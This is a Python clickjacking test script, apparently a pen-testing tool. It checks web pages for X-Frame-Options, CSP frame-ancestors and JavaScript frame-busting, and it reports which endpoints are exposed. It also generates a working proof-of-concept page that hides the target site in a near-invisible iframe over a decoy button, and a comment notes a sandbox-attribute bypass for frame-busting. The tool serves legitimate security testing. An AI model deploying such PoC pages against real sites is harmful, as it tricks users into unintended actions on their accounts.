#!/usr/bin/env python3
"""
Clickjacking Attack Test Agent — AUTHORIZED TESTING ONLY
Tests web applications for clickjacking (UI redressing) vulnerabilities by
checking frame-busting headers and generating proof-of-concept pages.

WARNING: Only use with explicit written authorization for the target application.
"""

import json
import sys
from datetime import datetime, timezone
from urllib.parse import urlparse

import requests


def check_frame_headers(url: str) -> dict:
    """Check X-Frame-Options and CSP frame-ancestors headers."""
    try:
        resp = requests.get(url, timeout=15, allow_redirects=True, verify=True)
    except requests.RequestException as e:
        return {"url": url, "error": str(e)}

    xfo = resp.headers.get("X-Frame-Options", "").upper()
    csp = resp.headers.get("Content-Security-Policy", "")
    frame_ancestors = ""

    if "frame-ancestors" in csp.lower():
        for directive in csp.split(";"):
            if "frame-ancestors" in directive.lower():
                frame_ancestors = directive.strip()
                break

    vulnerable = True
    protections = []

    if xfo in ("DENY", "SAMEORIGIN"):
        vulnerable = False
        protections.append(f"X-Frame-Options: {xfo}")
    elif xfo:
        protections.append(f"X-Frame-Options: {xfo} (non-standard)")

    if frame_ancestors:
        if "'none'" in frame_ancestors or "'self'" in frame_ancestors:
            vulnerable = False
        protections.append(f"CSP: {frame_ancestors}")

    return {
        "url": url,
        "status_code": resp.status_code,
        "x_frame_options": xfo if xfo else "MISSING",
        "csp_frame_ancestors": frame_ancestors if frame_ancestors else "MISSING",
        "protections": protections,
        "vulnerable": vulnerable,
        "severity": "HIGH" if vulnerable else "NONE",
    }


def check_multiple_endpoints(base_url: str, paths: list[str]) -> list[dict]:
    """Check multiple endpoints for clickjacking protection."""
    results = []
    for path in paths:
        url = f"{base_url.rstrip('/')}/{path.lstrip('/')}"
        result = check_frame_headers(url)
        results.append(result)
    return results


def generate_poc_html(target_url: str, action_description: str = "Click here") -> str:
    """Generate clickjacking proof-of-concept HTML page."""
    parsed = urlparse(target_url)
    return f"""<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - {parsed.hostname}</title>
    <style>
        body {{
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
        }}
        .overlay {{
            position: absolute;
            top: 150px;
            left: 50px;
            z-index: 2;
            background: rgba(255, 255, 255, 0.01);
            width: 200px;
            height: 50px;
            cursor: pointer;
        }}
        .decoy {{
            position: relative;
            z-index: 1;
        }}
        .decoy button {{
            position: absolute;
            top: 150px;
            left: 50px;
            padding: 15px 30px;
            font-size: 18px;
            background: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }}
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 600px;
            opacity: 0.0001;
            z-index: 3;
            border: none;
        }}
        .controls {{
            position: fixed;
            bottom: 10px;
            left: 10px;
            z-index: 10;
            background: #333;
            color: white;
            padding: 10px;
            border-radius: 5px;
        }}
        .controls input {{
            width: 60px;
        }}
    </style>
</head>
<body>
    <h2>Clickjacking Proof of Concept</h2>
    <p>Target: {target_url}</p>
    <div class="decoy">
        <button>{action_description}</button>
    </div>
    <iframe src="{target_url}" id="target-frame"></iframe>
    <div class="controls">
        <label>Opacity: <input type="range" id="opacity" min="0" max="100" value="0"
            oninput="document.getElementById('target-frame').style.opacity = this.value / 100"></label>
    </div>
</body>
</html>"""


def check_javascript_frame_busting(url: str) -> dict:
    """Check for JavaScript-based frame-busting code."""
    try:
        resp = requests.get(url, timeout=15)
    except requests.RequestException as e:
        return {"error": str(e)}

    body = resp.text.lower()
    frame_busting_patterns = [
        "top.location", "self.location", "window.top",
        "parent.frames", "top !== self", "top != self",
        "window.self !== window.top",
    ]

    found_patterns = [p for p in frame_busting_patterns if p in body]

    return {
        "url": url,
        "has_js_frame_busting": len(found_patterns) > 0,
        "patterns_found": found_patterns,
        "note": "JS frame-busting can be bypassed with sandbox attribute on iframe" if found_patterns else "",
    }


def generate_report(results: list[dict], js_checks: list[dict]) -> str:
    """Generate clickjacking test report."""
    lines = [
        "CLICKJACKING VULNERABILITY TEST REPORT — AUTHORIZED TESTING ONLY",
        "=" * 65,
        f"Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}",
        "",
        f"Endpoints Tested: {len(results)}",
        f"Vulnerable: {sum(1 for r in results if r.get('vulnerable', False))}",
        f"Protected: {sum(1 for r in results if not r.get('vulnerable', True))}",
        "",
        "RESULTS:",
        "-" * 50,
    ]

    for r in results:
        status = "VULNERABLE" if r.get("vulnerable") else "PROTECTED"
        lines.append(f"  [{status}] {r['url']}")
        lines.append(f"    X-Frame-Options: {r.get('x_frame_options', 'N/A')}")
        lines.append(f"    CSP frame-ancestors: {r.get('csp_frame_ancestors', 'N/A')}")

    if js_checks:
        lines.extend(["", "JAVASCRIPT FRAME-BUSTING:"])
        for jc in js_checks:
            has_js = "YES" if jc.get("has_js_frame_busting") else "NO"
            lines.append(f"  {jc.get('url', 'N/A')}: JS frame-busting: {has_js}")

    return "\n".join(lines)


if __name__ == "__main__":
    print("[!] CLICKJACKING TEST — AUTHORIZED TESTING ONLY\n")

    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [additional_paths...]")
        sys.exit(1)

    target_url = sys.argv[1]
    extra_paths = sys.argv[2:] if len(sys.argv) > 2 else [
        "/", "/login", "/settings", "/account", "/admin",
    ]

    print(f"[*] Testing {target_url} for clickjacking vulnerabilities...")
    results = check_multiple_endpoints(target_url, extra_paths)

    js_checks = []
    for r in results:
        if r.get("vulnerable"):
            jc = check_javascript_frame_busting(r["url"])
            js_checks.append(jc)

    report = generate_report(results, js_checks)
    print(report)

    vulnerable = [r for r in results if r.get("vulnerable")]
    if vulnerable:
        poc = generate_poc_html(vulnerable[0]["url"])
        poc_file = "clickjacking_poc.html"
        with open(poc_file, "w") as f:
            f.write(poc)
        print(f"\n[*] PoC saved to {poc_file}")
